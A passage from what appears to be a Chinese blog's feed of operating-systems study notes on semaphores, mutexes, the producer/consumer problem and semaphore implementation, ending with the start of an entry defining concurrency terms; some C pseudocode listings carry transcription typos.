 <span class="hljs-comment">/* 把进程P插入就绪队列*/</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>1、二元信号量初始化为0或1</p><p>2、<strong>semWaitB</strong>操作检查信号的值。若值为<strong>0</strong>，则进程执行 semWaitB 就会<strong>受阻</strong>。若值为<strong>1</strong>，则将值改为<strong>0</strong>，并<strong>继续执行该进程</strong></p><p>3、<strong>semSignalB</strong>操作<strong>检查</strong>是否有任何进程在该信号上<strong>受阻</strong>。若有进程受阻，则通过 <strong>semWaitB</strong> 操作，受阻的进程会被<strong>唤醒</strong>，若没有进程受阻，则值设置为<strong>1</strong></p><ul><li><p>二元信号量更易于实现</p><p>和普通信号具有同样的表达能力</p><p>非二元信号量也常称为<strong>计数信号量（counting semaphore）<strong>或</strong>一般信号量（general semaphore)</strong></p></li><li><p>与二元信号量相关的一个概念是<strong>互斥锁（mutex）</strong></p><ul><li>互斥是一个<strong>编程标志位</strong>，用来<strong>获取和释放一个对象</strong></li><li>当需要的数据<strong>不能被分享或处理</strong>，进而导致在系统中的其他地方<strong>不能同时执行</strong>时，互斥被设置为<strong>锁定</strong>（一般为0），用于<strong>阻塞</strong>其他程序使用数据</li><li>二元信号量和互斥量的<strong>关键区别</strong>在于，为互斥量<strong>加锁</strong>（设定值为 0）的进程和为互斥量<strong>解锁</strong>（设定值为1）的进程<strong>必须是同一个进程</strong></li></ul></li><li><p>计数信号量、二元信号量，都需要使用<strong>队列</strong>来保存于信号量上等待的进程=&gt;程按照什么顺序从队列中移出?最公平的策略：先进先出（FIFO）=&gt; <strong>强信号量（strong semaphore）</strong></p><ul><li>没有规定进程从队列中<strong>移出顺序</strong>的信号量称为<strong>弱信号量（weak semaphore）</strong></li></ul></li><li><p>信号量机制示例</p></li><li></li></ul><p>1、</p>  <img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5%EF%BC%88%E4%B8%8B%EF%BC%89/os3.jpg" class=""><p>2、</p>  <img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5%EF%BC%88%E4%B8%8B%EF%BC%89/os4.jpg" class=""><p>3、允许D运行</p>  <img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5%EF%BC%88%E4%B8%8B%EF%BC%89/os5.jpg" class=""><p>4、当D完成一个新结果后，它执行一条 semSignal指令，允许B移到就绪队列中</p>  <img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5%EF%BC%88%E4%B8%8B%EF%BC%89/os6.jpg" class=""><p>5、D加入就绪队列，C开始运行，当它执行 semWait指令时被阻塞</p>  <img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5%EF%BC%88%E4%B8%8B%EF%BC%89/os7.jpg" class=""><p>············</p><p>6、A 和B运行，且被阻塞在这个信号量上，允许D恢复执行。当D有一个结果后，执行一条 semSignal指令，把C移到就绪队列中，随后的D循环将解除A和B的阻塞状态</p>  <img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5%EF%BC%88%E4%B8%8B%EF%BC%89/os8.jpg" class="">  <img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5%EF%BC%88%E4%B8%8B%EF%BC%89/os9.jpg" class=""><h3 id="5-3-1-互斥">5.3.1 互斥</h3><ul><li><p>用信号量s解决互斥问题的方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*program mutualexclusion /</span><br><span class="hljs-comment">const int n = /*进程数 */</span>;<br>semaphore s = <span class="hljs-number">1</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">P</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span><br>&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>    semWait(s); <br>    <span class="hljs-comment">/* 临界区*/</span>;<br>    semSignal(s);<br>    <span class="hljs-comment">/*其余部分*/</span>;<br>&#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    parbegin (P(<span class="hljs-number">1</span>),P(<span class="hljs-number">2</span>),,P(n));<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>有n个进程，用数组P(i) 表示，所有进程都需要访问共享资源</li><li>每个进程进入临界区前执行 semWait（s），若 s 的值为负，则进程被阻塞</li><li>若值为1，则s 被减为0，进程立即进入临界区（s不再为正，因而其他任何进程都不能进入临界区）</li></ul></li><li><p>信号量一般初始化为1，这样<strong>第一个</strong>执行 semWait（s）的进程可<strong>立即进入临界区</strong>，并把s的值置为 0</p><p>接着任何试图进入临界区的其他进程，都将发现<strong>第一个进程忙</strong>，因此<strong>被阻塞</strong>，把 s 的值置为**-1**</p><p>可以有<strong>任意数量</strong>的进程试图进入，每个不成功的尝试都会使 s 的值<strong>减1</strong></p><p>当最初进入临界区的进程离开时，<strong>s 增 1</strong>→一个被阻塞的进程（如果有的话）<strong>被移出等待队列</strong>→置于<strong>就绪态</strong></p><p>进程访问受信号量保护的共享数据：（注意∶正常执行可以并行，但是临界区代码只能<strong>串行执行</strong>）</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5%EF%BC%88%E4%B8%8B%EF%BC%89/os1-16543108478401.jpg" class=""><ul><li>三个进程（A、B、C）访问一个<u>受信号量 lock 保护</u>的<strong>共享资源</strong></li><li>进程 A执行semWait（lock）→（信号量semWait在本次操作时值为<strong>1</strong>）A可以<strong>立即进入</strong>临界区→把信号量的值置为<strong>0</strong></li><li>当A 在临界区中时，B 和 C 都执行一个<strong>semWait</strong>操作并<strong>被阻塞</strong></li><li>当 A 退出临界区并执行时，队列中的第一个进程B现在可以进入临界区</li></ul></li><li><p>s.count的值的解释</p><ul><li>count≥0<ul><li>s.count是<strong>可执行</strong> semWait(s)而<strong>不被阻塞</strong>的进程数 [期间无semSignal(s) 执行]</li><li>这种情形允许<strong>信号量</strong>支持<strong>同步与互斥</strong></li></ul></li><li>s.count&lt;0<ul><li>s.count的大小是<strong>阻塞</strong>在s.queue队列中的进程数</li></ul></li></ul></li></ul><h3 id="5-3-2-生产者-消费者问题">5.3.2 生产者/消费者问题</h3><ul><li><p>分析<strong>并发</strong>处理中最常见的一类问题</p></li><li><p>描述：</p><ul><li>有<u>一个或多个</u><strong>生产者</strong>生产某种类型的数据（记录、字符），并放置在<strong>缓冲区</strong>中</li><li>有<u>一个</u><strong>消费者</strong>从缓冲区中取数据，<u>每次取一项</u></li><li>系统保证<strong>避免</strong><u>对缓冲区的重复操作</u>，即在任何时候<strong>只有一个</strong>主体（<u>生产者或消费者</u>）可访问缓冲区</li></ul></li><li><p>要确保：</p><ul><li>缓存已满时，生产者不添加数据</li><li>缓存为空时，消费者不移走数据</li></ul></li></ul><p>:one:假设<strong>缓冲区无限</strong>，且是一个<strong>线性</strong>的元素<u>数组</u></p><p>​ 定义生产者和消费者函数如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">producer:<br><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br><span class="hljs-comment">/*生产v*/</span>;<br>    b[in] = v;<br>    in++;<br>&#125;<br><br>consumer:<br><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>    <span class="hljs-keyword">while</span>(in &lt;= out)&#123;<span class="hljs-comment">/* do nothing */</span>;&#125;<br>    w = b[out];<br>    out++;<br>    <span class="hljs-comment">/* 消费w */</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>缓冲区b的结构:</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5%EF%BC%88%E4%B8%8B%EF%BC%89/os5.8.jpg" class=""><ul><li><p>消费者在<u>开始</u>进行之前应该确保生产者已经生产（in&gt;out）</p></li><li><p>使用<u>二元信号量</u>解决无限缓冲区生产者/消费者问题的<strong>不正确</strong>方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* program producerconeumer*/</span> <br><span class="hljs-type">int</span> n;<br>binary_semaphore s=<span class="hljs-number">1</span>,delay = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">producer</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>        produce(); <br>        SemWaitB（s）;<br>        appenid();<br>        n++;<br>        <span class="hljs-keyword">if</span> (n==<span class="hljs-number">1</span>) semSignalB(delay);<br>        Sems1gnalB(s);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">consumer</span><span class="hljs-params">()</span><br>&#123;<br>    semWaitB(delay);<br>whl1e (<span class="hljs-literal">true</span>)&#123;<br>        semWaitB(B);<br>        take();<br>        n--;<br>        semSignalB(R);<br>        consume();<br>        <span class="hljs-keyword">if</span>(n==<span class="hljs-number">0</span>) semWaitB(delay);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    n = <span class="hljs-number">0</span>;<br>    parbegin(producer,consumer);<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>不处理索引 in 和 out，而用整型变量 n（=in-out）简单地记录缓冲区中数据项的个数</li><li>信号量s用于实施<strong>互斥</strong></li><li>信号量 delay用于迫使消费者在<strong>缓冲区为空</strong>时<strong>等待</strong>（semWait）</li><li>生产者可以在<u>任何时候</u>自由地向缓冲区中增加数据项<ul><li>在<strong>添加数据前</strong>执行semWaitB（s），之后执行 semSignalB（s），以<strong>阻止</strong>消费者或任何其他生产者在添加操作过程中访问缓冲区</li><li>当生产者在临界区中时，将n的值+1</li><li>若n=1，则在本次添加之前缓冲区为空，生产者执行 semSignalB（delay）以通知消费者这个事实</li></ul></li><li>消费者<ul><li>消费者最初就使用 semWaitB（delay）<strong>等待</strong>生产出第一个项目，然后在自己的临界区中取到这一项并将n-1</li></ul></li><li>缺陷<ul><li>当<strong>消费者</strong>消耗尽缓冲区中的数据项时，需重<strong>置信号量 delay</strong>→<strong>被迫等待</strong>到生产者向缓冲区中放置更多的数据项→语句if n == 0 semWaitB（（delay）的目的</li></ul></li></ul></li><li><p>解决：引入一个辅助变量，使用二元信号量解决无限缓冲区生产者/消费者问题的正确方法↓</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*program producerconsumer */</span> <br><span class="hljs-type">int</span> n; <br>binary semaphore s = <span class="hljs-number">1</span>,delay = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">producer</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>        produce();<br>        semWaitB(s);<br>        append();<br>        n++;<br>        <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>) semSignalB(delay);<br>        semSignalB(s);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">consumer</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> m;<span class="hljs-comment">/*局部变量*/</span><br>    semWaitB(delay);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>        semWaitB(s);<br>        take();<br>        n--; <br>        m = n; <br>        semSignalB(s);<br>        consume();<br>        <span class="hljs-keyword">if</span>(m == <span class="hljs-number">0</span>) semWaitB(delay);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">()</span><br>&#123;<br>    n = <span class="hljs-number">0</span>;<br>parbegin (producer, consumer);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用信号量解决无限缓冲区生产者/消费者问题的方法[一般信号量（计数信号量）]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* proqram producerconsumer */</span><br>semaphore n = <span class="hljs-number">0</span>,<span class="hljs-number">3</span> = <span class="hljs-number">1</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">producer</span><span class="hljs-params">()</span><br>&#123;<br>    whi1e (<span class="hljs-literal">true</span>)&#123;<br>        produce();<br>        setwait(s);<br>        append(); semSignal(s);<br>        senSignal(n);<br>    &#125;<br>&#125;<br><br>vofd <span class="hljs-title function_">consumer</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>        semNait(n);<br>        semWait(s);<br>        take();<br>        semsignal(s);<br>        consume();<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    parbegin (producer,consumer);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>变量n为信号量，其值等于缓冲区中的项数</li><li>若不小心操作 semSignalB（s）和semSignalB（n）被互换→要求生产者在临界区中执行 semSignalB（n）操作时不会被消费者或另一个生产者打断→不会影响程序：无论何种情况，消费者在继续进行之前必须在两个信号量上等待</li><li>假设 semwait（n）和 semwait（s）操作偶然被颠倒：产生严重甚至致命的错误<ul><li>如果缓冲区为空（n.count =0）时消费者曾进入过临界区→任何一个生产者都不能继续向缓冲区中添加数据项→系统发生死锁</li></ul></li></ul></li></ul><p>:two:缓冲区有限：缓冲区被视为一个循环存储器</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5%EF%BC%88%E4%B8%8B%EF%BC%89/os5.12.jpg" class=""><ul><li><p>指针值按缓冲区的大小取模</p></li><li><p>总保持</p><table><thead><tr><th>被阻塞</th><th>解除阻塞</th></tr></thead><tbody><tr><td>生产者∶在满缓冲区中插入</td><td>消费者：移出一项</td></tr><tr><td>消费者∶从空缓冲区中移出</td><td>生产者∶插入一项</td></tr></tbody></table></li><li><p>生产者和消费者函数可表示成如下形式（变量in和out 初始化为0，n代表缓冲区的大小）∶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">producer:<br><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>    <span class="hljs-comment">/*生产v*/</span><br>    <span class="hljs-keyword">while</span>((in + <span class="hljs-number">1</span>) % n == out)<br>        <span class="hljs-comment">/* do nothing */</span><br>        b[in] = v;<br>    in = (in + <span class="hljs-number">1</span>) % n;<br>&#125;<br><br>consumer:<br><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>    <span class="hljs-keyword">while</span>(in == out)<br>        <span class="hljs-comment">/* do noting*/</span><br>    w = b[out];<br>    out = (out + <span class="hljs-number">1</span>) % n;<br>    <span class="hljs-comment">/* 消费w */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用信号量解决有限缓冲区生产者/消费者问题的方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*program boundedbuffer*/</span> <br><span class="hljs-type">const</span> <span class="hljs-type">int</span> sizeofbuffer =<span class="hljs-comment">/*缓冲区大小*/</span>; <br>semaphore s=<span class="hljs-number">1</span>,n= <span class="hljs-number">0</span>,e= sizeofbuffer;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">producer</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>        produce();<br>        semWait(e);<br>        semWait(s);<br>        append();<br>        semSignal(s);<br>        semSignal(n);<br>    &#125;<br>    <br><span class="hljs-type">void</span> <span class="hljs-title function_">consumer</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>        semwait(n);<br>        semwait(s);<br>        take();<br>        sersignal(s);<br>        semSignal(e);<br>        consume();<br>    &#125;<br>&#125;<br>    <br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    parbegin (producer,consumer);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>增加了信号量e来记录空闲空间的数量</li></ul></li></ul><h3 id="5-3-3-信号量的实现">5.3.3 信号量的实现</h3><ul><li>semWait 和 semSignal 操作必须作为原子原语实现</li><li>问题的本质是互斥∶任何时候只有一个 进程可用semWait或semSignal操作控制一个信号量</li></ul><p>:one:使用比较和交换指令实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">semWait(s)<br>&#123;<br><span class="hljs-keyword">while</span>(compare and swap(s.flag,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)== <span class="hljs-number">1</span>)&#123;<span class="hljs-keyword">do</span> nothing&#125;<br>    s.count--; <br>    <span class="hljs-keyword">if</span>(s.count &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">/* 该进程进入 s.queue 队列*/</span>; <br>        <span class="hljs-comment">/*阻寨该进程（还须将s.Flag设置为0）*/</span>;<br>    &#125;<br>    s.flag = <span class="hljs-number">0</span>; <br>&#125;<br><br>semsignal(s)<br>&#123;<br>    <span class="hljs-keyword">while</span>(compare and swap(s.flag,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)= <span class="hljs-number">1</span>)&#123;<span class="hljs-keyword">do</span> nothing&#125;<br>    s.Count++; <br>    <span class="hljs-keyword">if</span>(s.count &lt;= <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">/*从s.queue队列中移出进程P*/</span>;<br>        <span class="hljs-comment">/*进程 P进入就绪队列*/</span>;<br>    &#125;<br>    s.flag = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>这涉及某 种形式的忙等待，但 semWait和semSignal操作都相对较短，因此所涉及的忙等待时间量非常小</li></ul><p>:two:在 semwait 或 semSignal操作期间是可以禁用中断的，这些操作的执行时间相对很短，因此这种方法是合理的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">semwait(s)<br>&#123;<br>    禁用中断;<br>    s.count--;<br>    <span class="hljs-keyword">if</span>(s.count &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">/* 该进程进入s.queue 队列*/</span>;<br>        <span class="hljs-comment">/* 阻塞该进程，并允许中断*/</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        允许中断<br>    &#125;<br>&#125;<br><br>semSignal(s)<br>&#123;<br>    禁用中断; <br>    s.count++;<br>    <span class="hljs-keyword">if</span>(s.count &lt;= <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">/* 从s.queue 队列中移出进程P*/</span>;<br>        <span class="hljs-comment">/*进程 P进入就绪队列 */</span>;<br>    &#125;<br>    允许中断;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第五章-互斥和同步（一）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E5%B9%B6%E5%8F%91%E6%80%A7%EF%BC%9A%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1>第五章 并发性：同步和互斥</h1><ul><li>操作系统设计中的核心问题是进程和线程的管理<ul><li><strong>多道程序设计技术</strong>(Multiprogramming:)∶管理<u>单处理器</u>系统中的<u>多个进程</u></li><li><strong>多处理器技术</strong>(Multiprocessing)∶管理<u>多处理器</u>系统中的<u>多个进程</u></li><li><strong>分布式处理器技术</strong>(Distributed processing)∶管理<u>多台分布式计算机系统</u>中<u>多个进程</u>的执行，最近迅猛发展的集群就是这类系统的典型例子</li></ul></li><li>并发是所有问题的<u>基础</u>，也是操作系统设计的基础<ul><li>有进程间<strong>通信</strong></li><li><strong>资源</strong>共享与竞争 （如内存、文件、I/O访问）</li><li>多个进程活动的<strong>同步</strong></li><li>给进程分配<strong>处理器时间</strong></li><li>······</li></ul></li><li>并发会在以下三种不同的上下文中出现<ul><li><strong>多应用程序</strong>(Multiple applications)∶<u>多道程序设计技术</u>允许在多个活动的应用程序间<strong>动态共享</strong>处理器时间</li><li><strong>结构化应用程序</strong>(Structured applications)∶作为模块化设计和结构化程序设计的扩展，一些应用程序可被有效地设计成<strong>一组并发进程</strong></li><li><strong>操作系统结构</strong>(Operating system structure)∶同样的结构化程序设计优点适用于<strong>系统程序</strong>，且我们已知操作系统自身常常作为<strong>一组进程或线程</strong>实现</li></ul></li><li>支持并发进程的基本需求是<strong>加强互斥的能力</strong><ul><li>当一个进程被授予互斥能力时，那么在其活动期间，它具有排斥<u>所有其他进程的能力</u></li><li>三种方法∶信号量(semaphores)、管程(monitors)、消息传递(message passing)</li></ul></li><li>与并发相关的关键术语</li></ul><table><thead><tr><th>术语</th><th>说明</th></tr></thead><tbody><tr><td>原子操作<br />Atomic operation</td><td><u>一个函数或动作</u>由一个或多个指令的序列实现，<u>对外是不可见的</u><br />也就是说，没有其他进程可以看到其中间状态或能中断此操作。要保证指令序列要么作为一个组来执行，要么都不执行，<u>对系统状态没有可见的影响</u><br />原子性保证了<strong>并发进程的隔离</strong></td></tr><tr><td>临界区<br />Critical section</td><td><strong>一段代码</strong>，在这段代码中进程将访问<strong>共享资源</strong>，当另外一个进程已在这段代码中运行时，这个进程就不能在这段代码中执行</td></tr><tr><td>死锁<br />Deadlock</td><td>两个或两个以上的进程因每个进程<strong>都在等待</strong>其他进程做完某些事情而<strong>不能继续执行</strong>的情形</td></tr><tr><td>活锁<br />Livelock</td><td>两个或两个以上的进程<strong>为响应其他进程中的变化</strong>而<strong>持续改变自己的状态</strong>但<strong>不做有用的工作</strong>的情形</td></tr><tr><td>互斥<br />Mutual exclusion</td><td>当一个进程在<strong>临界区</strong>访问共享资源时，其他进程不能进入该临界区访问任何共享资源的情形</td></tr><tr><td>竞争条件<br />Race condition</td><td>多个线程或进程在读写一个<strong>共享数据</strong>时，结果依赖于它们执行的<strong>相对时间</strong>的情形</td></tr><tr><td>饥饿<br />Starvation</td><td>一个可运行进程尽管<strong>能继续执行</strong>，但<strong>被调度程序无限期地忽视</strong>，而不能被调度执行的情形</td></tr></tbody></table><h3 id="5-1-并发的原理">5.1 